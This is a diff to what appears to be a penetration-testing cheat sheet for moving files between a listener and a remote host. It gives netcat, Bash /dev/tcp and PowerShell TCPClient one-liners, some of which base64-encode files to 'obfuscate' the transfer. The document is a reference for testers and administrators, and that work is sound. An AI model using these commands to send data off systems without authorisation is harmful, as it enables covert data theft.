@@ -18,7 +18,7 @@
 nc -lp %ListeningPort% > /path/to/store/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:
 
 ```
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()}
@@ -34,7 +34,7 @@ nc -lp %ListeningPort% > /path/to/store/file.ext
 nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:
 
 ```
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()}
@@ -64,10 +64,10 @@ nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:
 
 ```
-
+cat < /dev/tcp/%ListenerAddress%/%ListenerPort% > /path/to/store/file.ext
 ```
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
@@ -86,10 +86,10 @@ nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
 nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:
 
 ```
-
+cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/file.ext
 ```
 
 ***
@@ -117,7 +117,7 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:
 
 ```
 cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -139,7 +139,7 @@ cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:
 
 ```
 base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -206,7 +206,7 @@ nc -lp port > /path/to/store/file.ext
 nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:
 
 ```
 cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -226,7 +226,7 @@ nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:
 
 ```
 base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -252,7 +252,7 @@ nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
 nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:
 
 ```
 
@@ -272,7 +272,7 @@ base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
 nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:
 
 ```
 
@@ -297,7 +297,7 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:
 
 ```
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()}
@@ -314,7 +314,7 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client connect back with PowerShell:
 
 ```
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()}
@@ -338,7 +338,7 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:
 
 ```
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close()}
@@ -356,7 +356,7 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
 
-###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows host connect back with PowerShell:
 
 ```
 & {$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $Data = [System.Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead); $Contents = $Contents + $Data }; $Base64String = [Convert]::FromBase64String($Contents); [IO.File]::WriteAllBytes("$FilePath", $Base64String); $NetworkStream.Close(); $TCPClient.Close()}
